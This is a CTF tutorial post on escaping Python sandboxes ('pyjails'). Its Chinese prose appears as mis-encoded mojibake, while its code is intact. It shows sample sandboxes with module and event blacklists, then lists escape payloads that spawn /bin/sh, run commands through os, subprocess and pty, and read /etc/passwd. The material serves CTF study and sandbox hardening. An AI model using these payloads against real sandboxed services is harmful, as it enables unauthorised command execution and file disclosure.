---
title: CTF Pyjail æ²™ç®±é€ƒé€¸åŸç†åˆé›†
date: 2023-05-29 05:04:02
categories:
- Python
tags:
- pyjail
toc: true
---


æ²™ç®±æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºåœ¨å—é™åˆ¶çš„ç¯å¢ƒä¸­è¿è¡Œæœªä¿¡ä»»çš„ç¨‹åºæˆ–ä»£ç ã€‚å®ƒçš„ä¸»è¦ç›®çš„æ˜¯é˜²æ­¢è¿™äº›ç¨‹åºæˆ–ä»£ç å½±å“å®¿ä¸»ç³»ç»Ÿæˆ–è€…è®¿é—®éæˆæƒçš„æ•°æ®ã€‚

åœ¨ Python ä¸­ï¼Œæ²™ç®±ä¸»è¦ç”¨äºé™åˆ¶ Python ä»£ç çš„èƒ½åŠ›ï¼Œä¾‹å¦‚ï¼Œé˜»æ­¢å…¶è®¿é—®æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œï¼Œæˆ–è€…é™åˆ¶å…¶ä½¿ç”¨çš„ç³»ç»Ÿèµ„æºã€‚

Python æ²™ç®±çš„å®ç°æ–¹å¼æœ‰å¤šç§ï¼ŒåŒ…æ‹¬ä½¿ç”¨ Python çš„å†…ç½®åŠŸèƒ½ï¼ˆå¦‚reæ¨¡å—ï¼‰ï¼Œä½¿ç”¨ç‰¹æ®Šçš„ Python è§£é‡Šå™¨ï¼ˆå¦‚PyPyï¼‰ï¼Œæˆ–è€…ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚RestrictedPythonï¼‰ã€‚ä½† Python çš„æ ‡å‡†åº“å’Œè¯­è¨€ç‰¹æ€§æä¾›äº†ç›¸å½“å¤šçš„å¯ä»¥ç”¨äºé€ƒé€¸æ²™ç®±çš„æ–¹æ³•ï¼Œå› æ­¤åœ¨å®è·µä¸­åˆ›å»ºä¸€ä¸ªå®Œå…¨å®‰å…¨çš„ Python æ²™ç®±éå¸¸å›°éš¾ã€‚æœ¬æ–‡å°†é¦–å…ˆå¯¹èµ›é¢˜ä¸­å¸¸è§çš„æ²™ç®±ç±»å‹è¿›è¡Œä»‹ç»ï¼Œç„¶åé’ˆå¯¹ä¸åŒçš„é€ƒé€¸ç›®æ ‡ï¼Œåˆ—ä¸¾äº†å¯ç”¨çš„ payloadï¼Œç”±äºç¯‡å¹…é™åˆ¶ï¼Œæœ¬æ–‡å¹¶ä¸æ¶‰åŠæ²™ç®±é€ƒé€¸çš„ç»•è¿‡æ‰‹æ³•ï¼Œç›¸å…³å†…å®¹ä¼šåœ¨åç»­çš„æ–‡ç« ä¸­å‘å¸ƒã€‚

## å¸¸è§æ²™ç®±

### exec æ‰§è¡Œ

Python çš„ `exec()` æ˜¯ä¸€ä¸ªå†…å»ºå‡½æ•°ï¼Œç”¨æ¥æ‰§è¡ŒåŠ¨æ€ç”Ÿæˆçš„ Python ä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ`exec()` å¯ä»¥æ‰§è¡Œå‚¨å­˜åœ¨å­—ç¬¦ä¸²æˆ–å¯¹è±¡ä¸­çš„ Python ä»£ç ã€‚è¿™æ˜¯ `exec()` çš„åŸºæœ¬è¯­æ³•ï¼š

```python
exec(object, globals, locals)
```

- `object` å¿…éœ€å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ–è€…æ˜¯ä»»ä½•å¯ä»¥è¢« `compile()` å‡½æ•°è½¬åŒ–ä¸ºä»£ç å¯¹è±¡çš„å¯¹è±¡ã€‚
- `globals` å¯é€‰å‚æ•°ï¼Œæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºå…¨å±€å‘½åç©ºé—´ (å…¨å±€å˜é‡)ï¼Œå¦‚æœæä¾›äº†ï¼Œåˆ™åœ¨æ‰§è¡Œä»£ç ä¸­è¢«ç”¨ä½œå…¨å±€å‘½åç©ºé—´ã€‚
- `locals` å¯é€‰å‚æ•°ï¼Œå¯ä»¥æ˜¯ä»»ä½•æ˜ å°„å¯¹è±¡ï¼Œè¡¨ç¤ºå±€éƒ¨å‘½åç©ºé—´ (å±€éƒ¨å˜é‡)ï¼Œå¦‚æœè¢«æä¾›ï¼Œåˆ™åœ¨æ‰§è¡Œä»£ç ä¸­è¢«ç”¨ä½œå±€éƒ¨å‘½åç©ºé—´ã€‚å¦‚æœä¸¤è€…éƒ½è¢«å¿½ç•¥ï¼Œé‚£ä¹ˆåœ¨ `exec()` è°ƒç”¨çš„åœ°æ–¹å†³å®šæ‰§è¡Œçš„å‘½åç©ºé—´ã€‚

exec è¿˜æœ‰å¦å¤–ä¸€ç§å†™æ³•ï¼š
```py
exec command in _global
``` 
å…¶ä¸­ `_global` ä¸ºä¸€ä¸ªå­—å…¸ï¼Œ è¡¨ç¤º command å°†åœ¨ `_global` æŒ‡å®šçš„å‘½åç©ºé—´ä¸­è¿è¡Œã€‚

ç¤ºä¾‹æ²™ç®±ï¼š
```py
#!/usr/bin/env python2
# -*- coding:utf-8 -*-


def banner():
    print "============================================="
    print "   Simple calculator implemented by python   "
    print "============================================="
    return


def getexp():
    return raw_input(">>> ")


def _hook_import_(name, *args, **kwargs):
    module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi',
                        'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache',
                        'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip',
                        'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil',
                        'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools',
                        'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new',
                        'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib',
                        'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile',
                        'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer',
                        'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',
                        'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib',
                        'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2',
                        'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport']
    for forbid in module_blacklist:
        if name == forbid:        # don't let user import these modules
            raise RuntimeError('No you can\' import {0}!!!'.format(forbid))
    # normal modules can be imported
    return __import__(name, *args, **kwargs)


def sandbox_filter(command):
    blacklist = ['exec', 'sh', '__getitem__', '__setitem__',
                 '=', 'open', 'read', 'sys', ';', 'os']
    for forbid in blacklist:
        if forbid in command:
            return 0
    return 1


def sandbox_exec(command):      # sandbox user input
    result = 0
    __sandboxed_builtins__ = dict(__builtins__.__dict__)
    __sandboxed_builtins__['__import__'] = _hook_import_    # hook import
    del __sandboxed_builtins__['open']
    _global = {
        '__builtins__': __sandboxed_builtins__
    }
    if sandbox_filter(command) == 0:
        print 'Malicious user input detected!!!'
        exit(0)
    command = 'result = ' + command
    try:
        exec command in _global     # do calculate in a sandboxed environment
    except Exception, e:
        print e
        return 0
    result = _global['result']  # extract the result
    return result


banner()
while 1:
    command = getexp()
    print sandbox_exec(command)

```

### eval æ‰§è¡Œ
eval çš„æ‰§è¡Œä¸ exec åŸºæœ¬ä¸€è‡´ï¼Œéƒ½å¯ä»¥å¯¹å‘½åç©ºé—´è¿›è¡Œé™åˆ¶ï¼Œä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼Œåœ¨è¿™ä¸ªç¤ºä¾‹ä¸­å°±æ˜¯ç›´æ¥å°†å‘½åç©ºé—´ç½®ç©ºï¼Œè¿™æ ·å°±ä½¿å¾—å†…ç½®çš„å‡½æ•°éƒ½æ— æ³•ä½¿ç”¨ã€‚
```py
print(
    eval(input("code> "), 
         {"__builtins__": {}},
        {"__builtins__": {}}
        )
    )
```
eval å’Œ exec ä¹‹é—´ä¹Ÿæœ‰åŒºåˆ«ã€‚

#### eval ä¸ exec çš„åŒºåˆ«
eval ä¸ exec çš„åŒºåˆ«å†äº exec å…è®¸ \n å’Œ ï¼› è¿›è¡Œæ¢è¡Œï¼Œè€Œ eval ä¸å…è®¸ã€‚
```py
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```
å¦‚æœåŠ å…¥äº† compile å‡½æ•°åˆ™éœ€è¦æŒ‰ç…§ compile å‡½æ•°çš„æ¨¡å¼è¿›è¡ŒåŒºåˆ†ã€‚
#### compile
compile() å‡½æ•°æ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥å°†æºç ç¼–è¯‘ä¸ºä»£ç æˆ– AST å¯¹è±¡ã€‚ç¼–è¯‘çš„æºç å¯ä»¥æ˜¯æ™®é€šçš„ Python ä»£ç ï¼Œä¹Ÿå¯ä»¥æ˜¯ AST å¯¹è±¡ã€‚
compile() å‡½æ•°çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š
```py
compile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1)
```
- sourceï¼šè¦ç¼–è¯‘çš„æºä»£ç ã€‚å¯ä»¥æ˜¯æ™®é€šçš„ Python ä»£ç ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ª AST å¯¹è±¡ã€‚
- filenameï¼šæºä»£ç çš„æ–‡ä»¶åã€‚
- modeï¼šæºä»£ç çš„ç§ç±»ã€‚å¯ä»¥æ˜¯ 'exec'ï¼Œ'eval' æˆ– 'single'ã€‚'exec' ç”¨äºæ¨¡å—ã€è„šæœ¬æˆ–è€…å‘½ä»¤è¡Œï¼Œ'eval' ç”¨äºç®€å•çš„è¡¨è¾¾å¼ï¼Œ'single' ç”¨äºå•ä¸€çš„å¯æ‰§è¡Œè¯­å¥ã€‚
- flags å’Œ dont_inheritï¼šè¿™ä¸¤ä¸ªå‚æ•°ç”¨äºæ§åˆ¶ç¼–è¯‘æºä»£ç æ—¶çš„æ ‡å¿—å’Œæ˜¯å¦ç»§æ‰¿ä¸Šä¸‹æ–‡ã€‚
- optimizeï¼šç”¨äºæŒ‡å®šä¼˜åŒ–çº§åˆ«ã€‚é»˜è®¤å€¼ä¸º -1ã€‚

mode å‚æ•°å†³å®šäº†å¦‚ä½•ç¼–è¯‘è¾“å…¥çš„æºä»£ç ã€‚å…·ä½“æ¥è¯´æœ‰ä¸‰ä¸ªå¯èƒ½çš„å€¼ï¼š 'exec'ï¼Œ'eval' å’Œ 'single'ã€‚
- 'exec'ï¼š exec æ–¹å¼å°±ç±»ä¼¼äºç›´æ¥ä½¿ç”¨ exec æ–¹æ³•ï¼Œå¯ä»¥å¤„ç†æ¢è¡Œç¬¦ï¼Œåˆ†å·ï¼Œimportè¯­å¥ç­‰ã€‚
- 'eval'ï¼š eval æ–¹å¼ä¹Ÿå°±ç±»ä¼¼äºç›´æ¥ä½¿ç”¨ evalï¼Œåªèƒ½å¤„ç†ç®€å•çš„è¡¨è¾¾å¼ï¼Œä¸æ”¯æŒæ¢è¡Œã€åˆ†å·ã€import è¯­å¥
- 'single'ï¼šè¿™ä¸ªæ¨¡å¼ç±»ä¼¼äº 'exec'ï¼Œä½†æ˜¯åªç”¨äºæ‰§è¡Œå•ä¸ªè¯­å¥(å¯ä»¥åœ¨è¯­å¥ä¸­æ·»åŠ æ¢è¡Œç¬¦ç­‰)ã€‚


### åŸºäº audit hook çš„æ²™ç®± 
Python 3.8 ä¸­å¼•å…¥çš„ä¸€ç§ audit hook çš„æ–°ç‰¹æ€§ã€‚å®¡è®¡é’©å­å¯ä»¥ç”¨æ¥ç›‘æ§å’Œè®°å½• Python ç¨‹åºåœ¨è¿è¡Œæ—¶çš„è¡Œä¸ºï¼Œç‰¹åˆ«æ˜¯é‚£äº›å®‰å…¨æ•æ„Ÿçš„è¡Œä¸ºï¼Œå¦‚æ–‡ä»¶çš„è¯»å†™ã€ç½‘ç»œé€šä¿¡å’ŒåŠ¨æ€ä»£ç çš„æ‰§è¡Œç­‰ã€‚

`sys.addaudithook(hook)` çš„å‚æ•° `hook` æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå…¶å®šä¹‰å½¢å¼ä¸º `hook(event: str, args: tuple)`ã€‚å…¶ä¸­ï¼Œ`event` æ˜¯ä¸€ä¸ªæè¿°äº‹ä»¶åç§°çš„å­—ç¬¦ä¸²ï¼Œ`args` æ˜¯ä¸€ä¸ªåŒ…å«äº†ä¸è¯¥äº‹ä»¶ç›¸å…³çš„å‚æ•°çš„å…ƒç»„ã€‚

ä¸€æ—¦ä¸€ä¸ªå®¡è®¡é’©å­è¢«æ·»åŠ ï¼Œé‚£ä¹ˆåœ¨è§£é‡Šå™¨è¿è¡Œæ—¶ï¼Œæ¯å½“å‘ç”Ÿä¸€ä¸ªä¸å®‰å…¨ç›¸å…³çš„äº‹ä»¶ï¼Œå°±ä¼šè°ƒç”¨è¯¥å®¡è®¡é’©å­å‡½æ•°ã€‚`event` å‚æ•°ä¼šåŒ…å«äº‹ä»¶çš„æè¿°ï¼Œ`args` å‚æ•°åˆ™åŒ…å«äº†äº‹ä»¶çš„ç›¸å…³ä¿¡æ¯ã€‚è¿™æ ·ï¼Œå®¡è®¡é’©å­å°±å¯ä»¥æ ¹æ®è¿™äº›ä¿¡æ¯è¿›è¡Œå®¡è®¡è®°å½•æˆ–è€…å¯¹æŸäº›äº‹ä»¶è¿›è¡Œé˜»æ­¢ã€‚

ä¸¾ä¾‹æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰è¿™æ ·çš„ä¸€ä¸ªå®¡è®¡é’©å­ï¼Œä½¿å¾—æ¯æ¬¡è§¦å‘ `open` äº‹ä»¶éƒ½ä¼šæ‰“å°ä¸€æ¡æ¶ˆæ¯ï¼š

```python
import sys

def audit_hook(event, args):
    if event == 'open':
        print(f'Opening file: {args}')

sys.addaudithook(audit_hook)
```

ç„¶åï¼Œå¦‚æœè¿è¡Œ `open('myfile.txt')`ï¼Œå°±ä¼šå¾—åˆ° `Opening file: ('myfile.txt',)` è¿™æ ·çš„è¾“å‡ºã€‚

åœ¨ä¸€äº›æ²™ç®±çš„é¢˜ç›®ä¸­ä¹Ÿä¼šä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œä¾‹å¦‚ï¼š
```py
    ...
def my_audit_hook(event, _):
    BALCKED_EVENTS = set({'pty.spawn', 'os.system', 'os.exec', 'os.posix_spawn','os.spawn','subprocess.Popen'})
    if event in BALCKED_EVENTS:
        raise RuntimeError('Operation banned: {}'.format(event))
    ...
    sys.addaudithook(my_audit_hook)
if __name__ == '__main__':
    main()
```
è¿™ä¸ªæ²™ç®±å¯¹`'pty.spawn', 'os.system', 'os.exec', 'os.posix_spawn','os.spawn','subprocess.Popen'` è¿™äº›å‡½æ•°è¿›è¡Œäº†é™åˆ¶ï¼Œä¸€æ—¦è°ƒç”¨åˆ™æŠ›å‡ºå¼‚å¸¸.

#### é»‘åå•
ä¸Šé¢çš„ç¤ºä¾‹å°±æ˜¯ä¸€ä¸ªé»‘åå•:
```py
    ...
def my_audit_hook(event, _):
    BALCKED_EVENTS = set({'pty.spawn', 'os.system', 'os.exec', 'os.posix_spawn','os.spawn','subprocess.Popen'})
    if event in BALCKED_EVENTS:
        raise RuntimeError('Operation banned: {}'.format(event))
    ...
    sys.addaudithook(my_audit_hook)
if __name__ == '__main__':
    main()
```

#### ç™½åå•
ç™½åå•æ¯”é»‘åå•çš„é™åˆ¶æ›´å¤§,ä¸‹é¢çš„æ²™ç®±åªå…è®¸ input exec compile ç­‰å‡½æ•°çš„è°ƒç”¨.
```py
...
def my_audit_hook(my_event, _):
    WHITED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
    if my_event not in WHITED_EVENTS:
        raise RuntimeError('Operation not permitted: {}'.format(my_event))
    ...
if __name__ == "__main__":
    sys.addaudithook(my_audit_hook)
    main()
```
ä¸€èˆ¬çš„ payload æ— æ³•ä½¿ç”¨:
```py
> __import__('ctypes').CDLL(None).system('ls /'.encode())
Operation not permitted: import
> [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")
Operation not permitted: os.system
```

### åŸºäº AST çš„æ²™ç®±
Python çš„æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼ŒAbstract Syntax Treeï¼‰æ˜¯ä¸€ç§ç”¨æ¥è¡¨ç¤º Python æºä»£ç çš„æ ‘çŠ¶ç»“æ„ã€‚åœ¨è¿™ä¸ªæ ‘çŠ¶ç»“æ„ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä»£è¡¨æºä»£ç ä¸­çš„ä¸€ç§ç»“æ„ï¼Œå¦‚ä¸€ä¸ªå‡½æ•°è°ƒç”¨ã€ä¸€ä¸ªæ“ä½œç¬¦ã€ä¸€ä¸ªå˜é‡ç­‰ã€‚Python çš„ ast æ¨¡å—æä¾›äº†ä¸€ç§æœºåˆ¶æ¥è§£æ Python æºä»£ç å¹¶ç”Ÿæˆè¿™æ ·çš„æŠ½è±¡è¯­æ³•æ ‘ã€‚
ä¸‹é¢æ˜¯Python `ast`æ¨¡å—çš„ä¸€äº›å¸¸è§èŠ‚ç‚¹ç±»å‹ï¼š
- `ast.Module`: è¡¨ç¤ºä¸€ä¸ªæ•´ä¸ªçš„æ¨¡å—æˆ–è€…è„šæœ¬ã€‚
- `ast.FunctionDef`: è¡¨ç¤ºä¸€ä¸ªå‡½æ•°å®šä¹‰ã€‚
- `ast.AsyncFunctionDef`: è¡¨ç¤ºä¸€ä¸ªå¼‚æ­¥å‡½æ•°å®šä¹‰ã€‚
- `ast.ClassDef`: è¡¨ç¤ºä¸€ä¸ªç±»å®šä¹‰ã€‚
- `ast.Return`: è¡¨ç¤ºä¸€ä¸ªreturnè¯­å¥ã€‚
- `ast.Delete`: è¡¨ç¤ºä¸€ä¸ªdelè¯­å¥ã€‚
- `ast.Assign`: è¡¨ç¤ºä¸€ä¸ªèµ‹å€¼è¯­å¥ã€‚
- `ast.AugAssign`: è¡¨ç¤ºä¸€ä¸ªå¢é‡èµ‹å€¼è¯­å¥ï¼Œå¦‚`x += 1`ã€‚
- `ast.For`: è¡¨ç¤ºä¸€ä¸ªforå¾ªç¯ã€‚
- `ast.While`: è¡¨ç¤ºä¸€ä¸ªwhileå¾ªç¯ã€‚
- `ast.If`: è¡¨ç¤ºä¸€ä¸ªifè¯­å¥ã€‚
- `ast.With`: è¡¨ç¤ºä¸€ä¸ªwithè¯­å¥ã€‚
- `ast.Raise`: è¡¨ç¤ºä¸€ä¸ªraiseè¯­å¥ã€‚
- `ast.Try`: è¡¨ç¤ºä¸€ä¸ªtry/exceptè¯­å¥ã€‚
- `ast.Import`: è¡¨ç¤ºä¸€ä¸ªimportè¯­å¥ã€‚
- `ast.ImportFrom`: è¡¨ç¤ºä¸€ä¸ªfrom...import...è¯­å¥ã€‚
- `ast.Expr`: è¡¨ç¤ºä¸€ä¸ªè¡¨è¾¾å¼ã€‚
- `ast.Call`: è¡¨ç¤ºä¸€ä¸ªå‡½æ•°è°ƒç”¨ã€‚
- `ast.Name`: è¡¨ç¤ºä¸€ä¸ªå˜é‡åã€‚
- `ast.Attribute`: è¡¨ç¤ºä¸€ä¸ªå±æ€§å¼•ç”¨ï¼Œå¦‚`x.y`ã€‚

ä»¥ä¸Šåˆ—ä¸¾çš„åªæ˜¯`ast`æ¨¡å—ä¸­ä¸€éƒ¨åˆ†çš„èŠ‚ç‚¹ç±»å‹ï¼Œè¿˜æœ‰å¾ˆå¤šå…¶ä»–ç±»å‹çš„èŠ‚ç‚¹ã€‚æ›´è¯¦ç»†çš„åˆ—è¡¨å¯ä»¥åœ¨Pythonå®˜æ–¹æ–‡æ¡£çš„`ast`æ¨¡å—éƒ¨åˆ†æ‰¾åˆ°ã€‚

ä¸€äº› CTF é¢˜ç›®å°±é‡‡ç”¨äº†æ£€æŸ¥ AST èŠ‚ç‚¹æ„å»ºæ²™ç®±, ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹. åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­, verify_secure å‡½æ•°å¯¹ compile ä¹‹åçš„ä»£ç è¿›è¡Œæ ¡éªŒ, ç¦æ­¢ ast.Import|ast.ImportFrom|ast.Call è¿™ä¸‰ç±»æ“ä½œ, è¿™æ ·ä¸€æ¥å°±æ— æ³•å¯¼å…¥æ¨¡å—å’Œæ‰§è¡Œå‡½æ•°.

```py
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```


## é€ƒé€¸ç›®æ ‡
äº†è§£æ²™ç®±é€ƒé€¸çš„ç›®æ ‡æ‰èƒ½æœ‰çš„æ”¾çŸ¢ï¼Œæ²™ç®±é€ƒé€¸çš„ç›®æ ‡æ˜¯æ‰§è¡Œ shell ã€è¯»å†™æ–‡ä»¶æˆ–è€…è·å–ç¯å¢ƒä¿¡æ¯å¦‚ç¯å¢ƒå˜é‡ç­‰.

### å‘½ä»¤æ‰§è¡Œ

#### timeit æ¨¡å—
```py
import timeit
timeit.timeit("__import__('os').system('ls')",number=1)
```

#### exec å‡½æ•°
```py
exec('__import__("os").system("ls")')
```

#### eval å‡½æ•°
```py
eval('__import__("os").system("ls")')
```
eval æ— æ³•ç›´æ¥è¾¾åˆ°æ‰§è¡Œå¤šè¡Œä»£ç çš„æ•ˆæœï¼Œä½¿ç”¨ compile å‡½æ•°å¹¶ä¼ å…¥ exec æ¨¡å¼å°±èƒ½å¤Ÿå®ç°ã€‚
```py
eval(compile('__import__("os").system("ls")', '<string>', 'exec'))
```

#### platform æ¨¡å—
```py
import platform
platform.sys.modules['os'].system('ls')
platform.os.system('ls')
```
#### osæ¨¡å—
- os.system
- os.popen
- os.posix_spawn
- os.exec*

```py
import os
os.system('ls')
__import__('os').system('ls')

os.popen("ls").read()

os.posix_spawn("/bin/ls", ["/bin/ls", "-l"], os.environ)
```

os.exec*()
```py
import os

# os.execl
os.execl('/bin/sh', 'xx')
__import__('os').execl('/bin/sh', 'xx')

# os.execle
os.execle('/bin/sh', 'xx', os.environ)
__import__('os').execle('/bin/sh', 'xx', __import__('os').environ)

# os.execlp
os.execlp('sh', 'xx')
__import__('os').execle('/bin/sh', 'xx', __import__('os').environ)

# os.execlpe
os.execlpe('sh', 'xx', os.environ)
__import__('os').execlpe('sh', 'xx', __import__('os').environ)

# os.execv
os.execv('/bin/sh', ['xx'])
__import__('os').execv('/bin/sh', ['xx'])

# os.execve
os.execve('/bin/sh', ['xx'], os.environ)
__import__('os').execve('/bin/sh', ['xx'], __import__('os').environ)

# os.execvp
os.execvp('sh', ['xx'])
__import__('os').execvp('sh', ['xx'])

# os.execvpe
os.execvpe('sh', ['xx'], os.environ)
__import__('os').execvpe('sh', ['xx'], __import__('os').environ)
```

os.fork() with os.exec*()
```py
(__import__('os').fork() == 0) and __import__('os').system('ls')
```

#### subprocess æ¨¡å—
```py
import subprocess
subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()

# python2
subprocess.call('whoami', shell=True)
subprocess.check_call('whoami', shell=True)
subprocess.check_output('whoami', shell=True)
subprocess.Popen('whoami', shell=True)

# python3
subprocess.run('whoami', shell=True)
subprocess.getoutput('whoami')
subprocess.getstatusoutput('whoami')
subprocess.call('whoami', shell=True)
subprocess.check_call('whoami', shell=True)
subprocess.check_output('whoami', shell=True)
subprocess.Popen('whoami', shell=True)
__import__('subprocess').Popen('whoami', shell=True)
```


#### ptyæ¨¡å—
- pty.spawn

ä»…é™Linuxç¯å¢ƒ

```py
import pty
pty.spawn("ls")
__import__('pty').spawn("ls")
```

#### importlib æ¨¡å—
```py
import importlib
__import__('importlib').import_module('os').system('ls')
# Python3å¯ä»¥ï¼ŒPython2æ²¡æœ‰è¯¥å‡½æ•°
importlib.__import__('os').system('ls')
```

#### sys

è¯¥æ¨¡å—é€šè¿‡ modules() å‡½æ•°è·å– os æ¨¡å—å¹¶æ‰§è¡Œå‘½ä»¤ã€‚

```py
import sys
sys.modules['os'].system('calc')
```

#### `__builtins__` åˆ©ç”¨
`__builtins__`ï¼š æ˜¯ä¸€ä¸ª builtins æ¨¡å—çš„ä¸€ä¸ªå¼•ç”¨ï¼Œå…¶ä¸­åŒ…å« Python çš„å†…ç½®åç§°ã€‚è¿™ä¸ªæ¨¡å—è‡ªåŠ¨åœ¨æ‰€æœ‰æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ä¸­å¯¼å…¥ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ `import builtins` æ¥å¯¼å…¥

å®ƒåŒ…å«è®¸å¤šåŸºæœ¬å‡½æ•°ï¼ˆå¦‚ printã€len ç­‰ï¼‰å’ŒåŸºæœ¬ç±»ï¼ˆå¦‚ objectã€intã€list ç­‰ï¼‰ã€‚è¿™å°±æ˜¯å¯ä»¥åœ¨ Python è„šæœ¬ä¸­ç›´æ¥ä½¿ç”¨ printã€len ç­‰å‡½æ•°ï¼Œè€Œæ— éœ€å¯¼å…¥ä»»ä½•æ¨¡å—çš„åŸå› ã€‚

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ dir() æŸ¥çœ‹å½“å‰æ¨¡å—çš„å±æ€§åˆ—è¡¨. å…¶ä¸­å°±å¯ä»¥çœ‹åˆ° `__builtins__`

å†…ç½®çš„å‡½æ•°ä¸­ open ä¸æ–‡ä»¶æ“ä½œç›¸å…³ï¼Œï¼ˆpython2 ä¸­ä¸º file å‡½æ•°ï¼‰
```py
__builtins__.open('/etc/passwd').read()
__import__("builtins").open('/etc/passwd').read()
```

`__builtins__`é™¤äº†è¯»å–æ–‡ä»¶ä¹‹å¤–è¿˜å¯ä»¥é€šè¿‡è°ƒç”¨å…¶ `__import__` å±æ€§æ¥å¼•å…¥åˆ«çš„æ¨¡å—æ‰§è¡Œå‘½ä»¤ã€‚
```py
>>> __builtins__.__import__
<built-in function __import__>
>>> __builtins__.__import__('os').system('ls')
```
ç”±äºæ¯ä¸ªå¯¼å…¥çš„æ¨¡å—éƒ½ä¼šç•™å­˜ä¸€ä¸ª `__builtins__` å±æ€§ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„çš„æ¨¡å—ä¸­é€šè¿‡`__builtins__`æ¥å¼•å…¥æ¨¡å—æˆ–è€…æ‰§è¡Œæ–‡ä»¶æ“ä½œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ`__builtins__`åœ¨æ¨¡å—çº§åˆ«å’Œå…¨å±€çº§åˆ«çš„è¡¨ç°æœ‰æ‰€ä¸åŒã€‚

åœ¨å…¨å±€çº§åˆ«ï¼ˆä¹Ÿå°±æ˜¯ä½ åœ¨Pythonäº¤äº’å¼è§£é‡Šå™¨ä¸­ç›´æ¥æŸ¥çœ‹`__builtins__`æ—¶ï¼‰ï¼Œ`__builtins__`å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ¨¡å—`<module '__builtin__' (built-in)>`ã€‚

åœ¨æ¨¡å—çº§åˆ«ï¼ˆä¹Ÿå°±æ˜¯ä½ åœ¨ä¸€ä¸ªPythonè„šæœ¬ä¸­æŸ¥çœ‹__builtins__ï¼‰ï¼Œ`__builtins__`æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¿™ä¸ªå­—å…¸åŒ…å«äº†`__builtin__`æ¨¡å—ä¸­æ‰€æœ‰çš„å‡½æ•°å’Œç±»ã€‚


å› æ­¤ï¼Œå½“é€šè¿‡å…¶ä»–æ¨¡å—çš„ `__builtins__`æ—¶ï¼Œå¦‚`__import__('types').__builtins__`æ—¶ï¼Œå®é™…ä¸Šçœ‹åˆ°çš„æ˜¯ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†æ‰€æœ‰çš„å†…å»ºå‡½æ•°å’Œç±»ã€‚æ­¤æ—¶è°ƒç”¨çš„æ–¹å¼æœ‰æ‰€å˜åŒ–ã€‚
```py
>>> __import__('types').__builtins__['__import__']
<built-in function __import__>
```

#### help å‡½æ•°
help å‡½æ•°å¯ä»¥æ‰“å¼€å¸®åŠ©æ–‡æ¡£. ç´¢å¼•åˆ° os æ¨¡å—ä¹‹åå¯ä»¥æ‰“å¼€ sh

ä»¥ä¸‹é¢çš„ç¯å¢ƒä¸ºä¾‹

```py
eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
```
